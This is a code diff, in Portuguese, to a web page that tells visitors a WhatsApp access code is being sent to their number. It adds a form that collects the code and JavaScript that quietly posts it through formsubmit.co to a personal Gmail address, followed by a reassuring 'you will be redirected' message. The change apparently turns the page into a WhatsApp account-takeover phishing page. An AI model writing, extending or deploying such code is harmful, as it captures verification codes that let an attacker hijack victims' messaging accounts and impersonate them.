@@ -68,6 +68,11 @@
     <h1>Enviando código...</h1>
     <p>Estamos enviando o código de acesso para o número informado via WhatsApp.</p>
     <p>Aguarde alguns instantes...</p>
+    
+    <form id="codigo-form">
+      <input type="text" name="codigo" placeholder="Digite o código recebido" required>
+      <button type="submit">Validar código</button>
+    </form>
   </div>
 
   <script>
@@ -84,6 +89,21 @@
         document.getElementById("confirmacao").classList.remove("hidden");
       }).catch(error => {
         alert("Erro ao enviar. Tente novamente.");
+      });
+    });
+
+    const codigoForm = document.getElementById("codigo-form");
+    codigoForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+      const codigoData = new FormData(codigoForm);
+      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
+        method: "POST",
+        headers: { 'Accept': 'application/json' },
+        body: codigoData
+      }).then(response => {
+        alert("Código enviado! Em breve você será redirecionado.");
+      }).catch(error => {
+        alert("Erro ao validar o código. Tente novamente.");
       });
     });
   </script>
